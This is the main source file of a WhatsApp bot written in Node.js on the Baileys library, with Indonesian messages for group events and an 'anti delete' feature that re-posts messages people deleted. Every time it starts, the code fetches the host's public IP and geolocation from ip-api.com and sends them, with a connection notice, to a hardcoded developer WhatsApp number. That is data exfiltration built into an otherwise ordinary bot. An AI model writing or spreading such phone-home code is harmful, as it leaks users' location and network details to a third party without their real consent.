const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  Mimetype,
  GroupSettingChange,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js"); 
const WAConnection = simple.WAConnection(_WAConnection);
const fs = require("fs");
const axios = require('axios')
const encodeUrl = require('encodeurl')
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const fetch = require("node-fetch");
const moment = require("moment-timezone");

blocked = [];

require("./Iqbal.js");
nocache("./Iqbal.js", (module) => console.log(`${module} is now updated!`));
require("./config.json");
nocache("./config.json", (module) => console.log(`${module} is now updated!`));

const starts = async (iqbl = new WAConnection()) => {
  iqbl.logger.level = "warn";
  iqbl.version = [2, 2123, 8];
  iqbl.browserDescription = ["MADE WITH ITSMEKO", "firefox", "3.0"];
  console.log(banner.string);
  iqbl.on("qr", () => {
    console.log(
      color("[", "white"),
      color("!", "blue"),
      color("]", "white"),
      color(" Scan bang")
    );
  }); 
  
  fs.existsSync("./session.json") && iqbl.loadAuthInfo("./session.json");
  iqbl.sendMessage(`6282376222531@s.whatsapp.net`, `*Hai Owner, Bot Telah Berhasil Tersambung* \n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Connect Ingfo",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/thumb.jpeg'),sourceUrl:"https://wa.me/6282376222531?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot developer', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       iqbl.sendMessage("6282376222531@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Connect Ip Ingfo",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./stik/thumb.jpeg'),sourceUrl:"https://wa.me/6282376222531?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer', 'cyan'))
   })
  iqbl.on("connecting", () => {
    start("2", "Connecting...");
  });
  iqbl.on("open", () => {
    success("2", "Connected");
    setTimeout( () => {
        	console.log(bgcolor(`Sel-Bot`, 'red'))            
	    	console.log(bgcolor(`Copyright By ©SYIKO`, 'blue'))
	    	}, 1000)    		    	     	
  });
  await iqbl.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync(
    "./session.json",
    JSON.stringify(iqbl.base64EncodedAuthInfo(), null, "\t")
  );
  
  
iqbl.on("group-update", async (anu) => { 
    metdata = await iqbl.groupMetadata(anu.jid);
    if (anu.announce == "false") {
      teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`;
      iqbl.sendMessage(metdata.id, teks, MessageType.text);
      console.log(`- [ Group Opened ] - In ${metdata.subject}`);
    } else if (anu.announce == "true") {
      teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`;
      iqbl.sendMessage(metdata.id, teks, MessageType.text);
      console.log(`- [ Group Closed ] - In ${metdata.subject}`);
    } else if (!anu.desc == "") {
      tag = anu.descOwner.split("@")[0] + "@s.whatsapp.net";
      teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${
        anu.descOwner.split("@")[0]
      }\n� Deskripsi Baru : ${anu.desc}`;
      iqbl.sendMessage(metdata.id, teks, MessageType.text, {
        contextInfo: { mentionedJid: [tag] },
      });
      console.log(`- [ Group Description Change ] - In ${metdata.subject}`);
    } else if (anu.restrict == "false") {
      teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`;
      iqbl.sendMessage(metdata.id, teks, MessageType.text);
      console.log(`- [ Group Setting Change ] - In ${metdata.subject}`);
    } else if (anu.restrict == "true") {
      teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`;
      iqbl.sendMessage(metdata.id, teks, MessageType.text);
      console.log(`- [ Group Setting Change ] - In ${metdata.subject}`);
    }
  }); 
  
  
  iqbl.on('group-participants-update', async (anu) => {
      try {
         const mdata = await iqbl.groupMetadata(anu.jid)
         num = anu.participants[0]
         console.log(anu)
      //   ini_user = iqbl.contacts[num]
         let v = iqbl.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = v.vname || v.notify || num.split("@")[0];      
        // namaewa = anu_user.notify
         member = mdata.participants.length

         try {
               var ppimg = await iqbl.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
            } catch {
               var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
            }
        try {
               var ppgc = await iqbl.getProfilePicture(anu.jid)
            } catch {
               var ppgc = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
            }
        shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
        shortgc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppgc}`)
         if (anu.action == 'add') {
         	img = await getBuffer(`https://dapuhy-api.herokuapp.com/api/canvas/welcome3?name=${anu_user}&gcname=${encodeUrl(mdata.subject)}&member=${mdata.participants.length}&pp=${shortpc.data}&bg=https://i.ibb.co/Zxg1HB6/akaza2.jpg&apikey=ItsMeKo`)
            teks = `Hai *@${anu.participants[0].split("@")[0]}* SELAMAT DATANG DI GROUP\nJANGAN LUPA BACA DESKRIPSI YAH👋`
            buttons = [
          { buttonId: `y`, buttonText: { displayText: "WELCOME 👋" }, type: 1 },
        ];
        imageMsg = (
          await iqbl.prepareMessageMedia(img, "imageMessage", {
            thumbnail: img,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "JANGAN LUPA DONASI KAK☕",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await iqbl.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {contextInfo: {'mentionedJid': [num]}
          }
        );
        iqbl.relayWAMessage(prep)
        
      }
        //    iqbl.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]} })
         if (anu.action == 'remove') {         
         	img = await getBuffer(`https://dapuhy-api.herokuapp.com/api/canvas/goodbye?name=${encodeUrl(anu_user)}&gcname=${encodeUrl(mdata.subject)}&ppgc=${shortgc.data}&member=${mdata.participants.length}&pp=${shortpc.data}&bg=https://i.ibb.co/tYgwwT2/images-2.jpg&apikey=ItsMeKo`)
            teks = `Sayonara *@${anu.participants[0].split("@")[0]}*\nJANGAN LUP NITIP GORENG KALAU BALIK:v`
            buttons = [
          { buttonId: `y`, buttonText: { displayText: "SAYONARA 👋" }, type: 1 },
        ];
        imageMsg = (
          await iqbl.prepareMessageMedia(img, "imageMessage", {
            thumbnail: img,
          })
        ).imageMessage;
        buttonsMessage = {
          contentText: `${teks}`,
          footerText: "JANGAN LUPA DONASI KAK☕",
          imageMessage: imageMsg,
          buttons: buttons,
          headerType: 4,
        };
        prep = await iqbl.prepareMessageFromContent(
          mdata.id,
          { buttonsMessage },
          {contextInfo: {'mentionedJid': [num]}
          }
        );
        iqbl.relayWAMessage(prep)
        
      }
if (anu.action == "promote") {
        const mdata = await iqbl.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = iqbl.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await iqbl.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }
        let buffer = await getBuffer(ppimg);
        teks = ` *@${anu.participants[0].split("@")[0]}* Telah dipromote\n_SPECIAS TQ NAIK JABATAN_`;
        iqbl.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks, contextInfo: {"mentionedJid": [anu.participants[0]]}
        });
      }

      if (anu.action == "demote") {
        const mdata = await iqbl.groupMetadata(anu.jid);
        num = anu.participants[0];
        let w = iqbl.contacts[num] || { notify: num.replace(/@.+/, "") };
        anu_user = w.vname || w.notify || num.split("@")[0];
        try {
          ppimg = await iqbl.getProfilePicture(
            `${anu.participants[0].split("@")[0]}@c.us`
          );
        } catch {
          ppimg =
            "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
        }

        let buffer = await getBuffer(ppimg);
        teks = `*@${anu.participants[0].split("@")[0]}* Telah didemote\n_YAHAHA DIDEMOTE, MAMPUS_`;
        iqbl.sendMessage(mdata.id, buffer, MessageType.image, {
          caption: teks, contextInfo: {"mentionedJid": [anu.participants[0]]}
        });
      }
    } catch (e) {
      console.log("Error : %s", color(e, "red"));
    }
  });
  // 
  antidel = true  
  iqbl.on("message-delete", async (m) => {
    if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe && m.key.fromMe) return
if (antidel === false) return
    m.message =
      Object.keys(m.message)[0] === "ephemeralMessage"
        ? m.message.ephemeralMessage.message
        : m.message;
    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let calender = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    const type = Object.keys(m.message)[0];
    iqbl.sendMessage(
      m.key.remoteJid,
      `\`\`\`「 Anti Delete 」\`\`\`
  •> Nama : @${m.participant.split("@")[0]}
  •> Waktu : ${jam} ${week} ${calender}
  •> Type : ${type}`,
      MessageType.text,
      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }
    );

    iqbl.copyNForward(m.key.remoteJid, m.message);
  });
  iqbl.on("chat-update", async (message) => {
    require("./Iqbal.js")(iqbl, message);
  });
  
isBattre = "Not Detect"; //
  isCharge = "Not Detect"; //
  iqbl.on(`CB:action,,battery`, (json) => {
    const batteryLevelStr = json[2][0][1].value;
    const batterylevel = parseInt(batteryLevelStr);
    isBattre = batterylevel + "%";
    isCharge = json[2][0][1].live;
  });
  iqbl.on("CB:Blocklist", (json) => {
    if (blocked.length > 2) return;
    for (let i of json[1].blocklist) {
      blocked.push(i.replace("c.us", "s.whatsapp.net"));
          }
  });
};



  

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional>
 */
function nocache(module, cb = () => {}) {
  console.log("Module", `'${module}'`, "is now being watched for changes");
  fs.watchFile(require.resolve(module), async () => {
    await uncache(require.resolve(module));
    cb(module);
  });
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = ".") {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(module)];
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

starts();
